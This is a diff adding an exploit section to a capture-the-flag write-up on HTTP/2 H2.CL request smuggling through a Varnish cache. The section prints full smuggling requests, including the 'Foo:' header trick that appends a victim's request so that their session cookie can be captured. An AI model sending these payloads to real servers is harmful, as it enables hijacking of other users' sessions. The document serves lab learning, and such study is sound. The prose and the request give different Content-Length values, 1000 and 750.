@@ -384,3 +384,82 @@ H2 request smuggling is essentially a variant of request smuggling, but instead 
 
 One of the things that can go wrong in this conversion is that the **content length is not required in HTTP/2 [rfc7540]** due to H2’s frame structure. However, **if an incorrect content length is specified in the H2 request and written to the new HTTP/1.1 request without any checks, a confusion can arise between the server where a request starts and ends**.
 
+### Exploit POC -
+
+To confirm  H2.CL request smuggling, we first send the following request:
+
+```http
+POST /send_message HTTP/2
+Host: 10.10.65.138:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 750
+Origin: https://10.10.65.138:80
+
+
+data=test
+
+POST /send_message HTTP/2
+Host:10.10.65.138:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
+Foo:
+
+
+```
+
+We get `503 Service Unavailable` response indicating it is a **Varnish cache server**.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/eefb83d1-a5e5-4c50-8163-9f107020a200)
+
+
+The above request has content length of 1000, so the server will wait for rest of the content to reach. `Foo: ` has been included in the smuggled request so that when the next request comes, it will be appened to it & thus get treated as an invalid header thereby doesn't cause any issues. Else our smuggled request would become invalid.
+
+- Without `Foo: ` header,our smuggled request would become invalid. This causes parsing issues because the second line doesn't fit the expected header format.
+
+```http
+GET /doesnotexist HTTP/1.1
+Host:10.10.65.138:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
+GET /getMessages HTTP/2
+Host: 10.10.65.138:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.65.138:80/messages
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+```
+
+- Here, the Foo: header with an invalid value `GET /getMessages HTTP/2` will be treated as a malformed header by the server.
+
+```http
+GET /doesnotexist HTTP/1.1
+Host:10.10.65.138:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
+Foo: GET /getMessages HTTP/2
+Host: 10.10.65.138:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ZlXjCg.PpqgVjw-m8EwLX-W2JdoTOunpTw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://10.10.65.138:80/messages
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+```
+
+We first need to send the below smuggled request
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/b10af922-ce64-4f4b-88f1-4920e3f43ed9)
+
+Now, after few seconds, we we request the `/getMessages` endpoint, we can see the request made from Jack user. The cookie of Jack's account contains the flag.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/6b514f84-310d-4742-92a1-da7784232bf6)
+
